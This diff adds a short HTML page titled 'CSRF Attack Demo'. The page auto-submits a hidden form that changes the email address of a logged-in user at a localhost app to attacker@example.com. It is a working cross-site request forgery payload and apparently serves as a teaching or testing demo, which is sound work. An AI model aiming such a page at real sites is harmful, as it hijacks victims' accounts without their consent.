@@ -1,0 +1,16 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CSRF Attack Demo</title>
+</head>
+<body>
+  <form action="http://localhost:3000/change-email" method="POST">
+    <input type="hidden" name="email" value="attacker@example.com">
+  </form>
+  <script>
+
+    document.forms[0].submit();
+  </script>
+</body>
+</html>
